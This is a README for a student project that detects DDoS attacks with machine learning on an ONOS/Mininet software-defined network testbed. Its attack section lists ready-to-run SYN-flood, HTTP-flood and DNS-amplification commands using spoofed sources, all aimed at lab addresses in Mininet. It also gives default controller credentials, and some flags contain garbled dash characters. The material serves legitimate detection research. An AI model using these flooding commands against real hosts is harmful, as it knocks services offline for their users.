# DDos_20-21_final_Yr_Prj_7thSem_cont

Algorithm that I developed behind the Product:
https://docs.google.com/drawings/d/1a1MRlD4dvMvUJTn9D1hbsjtm-zcF2Vw1PNB3HXU3hYc/edit?usp=sharing

## Git Shortcuts for remote branch
* git pull origin main (required if having conflicting branches @remote and @Local)
* git push -u origin main

## Steps to run project
* Step1: Build and run ONOS
* Step2: Activate applications(openflow and fwd) in ONOS
* Step3: Train ML model(to remove machine dependencies like module version)
* Step4: Run ML server
* Step5: Compile and Install project application
* Step6: Activate project application
* Step7: Perform attacks
* Step8: check log and flow rules made

## Requirements:
* Mininet 2.2.2
* Maven 3.6.0
* Bazel 2.1.1
* python3 3.6.9
* python2 2.7.15+
* onos 2.4.0
* java 11.0.6
* python3/python2 modules:
* 	sklearn 0.23.1
* 	pandas 0.25.3
* 	numpy 1.18.4
*	pickle 4.0
* mausezahn
* hping3
* git

## Installing Mininet
* sudo apt-get install mininet

## Installing Maven
* sudo apt-get install maven

## Installing Bazel
* sudo apt-get install bazel

## Installing python3.6 and its modules

sudo apt−get install python3.6

sudo apt−get install python3−pip

uSe this instead kamal: 
sudo apt-get update
sudo apt install python3-pip

sudo pip3 install numpy
sudo pip3 install sklearn
sudo pip3 install pickle
sudo pip3 install pandas

## Installing hping3 and mausezahn
* sudo apt-get install hping3
* sudo apt-get install netsniff-ng 

## Getting ONOS source code
* git clone https://gerrit.onosproject.org/onos


## Testbed setup (Running ONOS and ML server)

## Building ONOS source code using bazel
* cd onos
* bazel clean
* bazel build onos

## Running ONOS server instance
* bazel run onos-local clean

## Setting up command environment for ONOS
* Append at end of .bashrc file
* gedit $HOME/.bashrc
* export ONOS_ROOT=<path-of-onos-source-code>
* source $ONOS_ROOT/tools/dev/bash_profile
* Save and exit .bashrc
* source $HOME/.bashrc

## Accessing ONOS CLI
* onos karaf@localhost
* password: **karaf**


## Activating apps inside ONOS(in ONOS CLI)
* app activate org.onosproject.openflow
* app activate org.onosproject.fwd


## Configuring Forwarding application(in ONOS CLI)

*cfg set org.onosproject.fwd.ReactiveForwarding.matchIpv4Address true
		//to have reactiveFwd (org.onosproject.fwd) enabled with automatic IP-based matching instead of MAC matching
* cfg set org.onosproject.fwd.ReactiveForwarding.matchTcpUdpPort true
* cfg set org.onosproject.fwd.ReactiveForwarding.flowTimeout 1

## Note : if configuration via above technique fails , then same could be achieved by modifying values in files given below:

1./onos/apps/fwd/src/main/java/org/onosproject/fwd/OsgiPropertyConstants.java
		static final boolean MATCH_IPV4_ADDRESS_DEFAULT = true;
		static final int FLOW_TIMEOUT_DEFAULT = 1;
		static final boolean MATCH_TCP_UDP_PORTS_DEFAULT = true;

2./onos/apps/fwd/src/main/java/org/onosproject/fwd/ReactiveForwarding.java
		private int flowTimeout = 1;
		private boolean matchIpv4Address = true;
		private boolean matchTcpUdpPorts = true;
and then onos should be runned again after stopping and re-compiling using:
	bazel run onos-local clean


display:log | tail

## Accessing the GUI 
* Go to http://127.0.0.1:8181/onos/ui/index.html
* username : **onos**
* password : **rocks**

## Training ML model(MLP algorithm)        ***Note : this is not needed as we already have the svm file
* python3 train_model.py

## Running Python-Server 1 for machine-learning detection in Detection Phase 1 (at Network)
		* python3 ml_server.py

## Running Python-Server 2 for machine-learning detection in Detection Phase 2 (Identification of Server being Attacked)
		* python3 ml_server2.py



## Application Compile and installation

## Making ONOS Application skeleton [**optional**]
* onos−create−app app org.ddos ddos−app 2.0−SNAPSHOT org.ddos.app

onos-create-app

** and now enter above info one by one ex.  1)org.ddos 2)ddos−app 3)2.0−SNAPSHOT 4)org.ddos.app 5)onosVersion = 2.2.0


## Compiling Application source code
* Copy ddos-app folder to the ONOS source code folder
* cd ddosmodule
* mvn clean install -Dcheckstyle.skip


## Installing Application on ONOS
* onos-app 127.0.0.1 install target/ddosmodule*.oar
* Activating app in ONOS CLI
* app activate org.ddosmodule
* Application installation and activation can be done same time using following command:
* onos-app 127.0.0.1 install! target/ddos-app*.oar

## Performing attacks in Mininet topology

--------------------------------------------- Method 1 : (using automatic scripts) -------------------

for Normal traffic :
						sudo python create_traffic.py
for Attack traffic :
						sudo python create_traffic_attack.py

--------------------------------------------- Method 2 : (via xterm on Mininet) ------------------


## Making topology in mininet
* sudo mn --controller=remote,ip=127.0.0.1,port=6653 --topo=tree,depth=2,fanout=4

## HTTP Flood attack

* Making HTTP server
* xterm h1
* python -m SimpleHTTPServer 80

* Attacking using Mausezahn
* mausezahn h6-eth0 -t tcp "sp=1-65535, dp=80, flag=syn" -A rand -B 10.0.0.1 -c 100 -d 1m

* Attacking using go-httpflood
* python tools/PyFlooder/pyflooder.py 10.0.0.1
* Attacking using go-httpflood
* ./tools/go-httpflood/httpflood 10.0.0.1 80 100

python /home/<user>/Desktop/CS-06_8-Sem_project_all/tools/PyFlooder/pyflooder.py 10.0.0.1

* Attacking using HULK
* python tools/hulk_tool/hulk.py http://10.0.0.1
* ./hulk_tool/hulk http://10.0.0.1/cwb-nc.zip

python /home/<user>/Desktop/CS-06_8-Sem_project_all/tools/hulk_tool/hulk.py http://10.0.0.1

* Attacking using torshammer
* python tools/http_post/http_post.py -t 10.0.0.1 -r 1000 -p 80

* Attacking using hping3
* hping3 --rand-source –S –L 0 –p 80 <target IP>

## Performing DNS-Amplification attack
* Making DNS Server
* python tools_project/dnsserver.py
* Attacking by spoofing-ips
* tools_project/dns_spquery <victim-ip> <dnsserver-ip> <requestedurl>
* tools_project/dns_spquery 10.0.0.1 10.0.0.3 www.ddos.com
* Using mausezahn
* mausezahn <interface(hostname-eth0)> −t dns −A <victim-ip> −B <dns_server-ip> "question" −d 10m
* mausezahn h16−eth0 −t dns −A 10.0.0.1 −B 10.0.0.3 "q=www.ddos.com" −d 10m

## Checking flow-rules
* Using GUI(in browser)
* http://<controller−ip>:8181/ONOS/v1/flows/<device−id>
* http://localhost:8181/ONOS/v1/flows/of:000000000000000c
* search for "org.ddos" to get flow-rule made by applicati
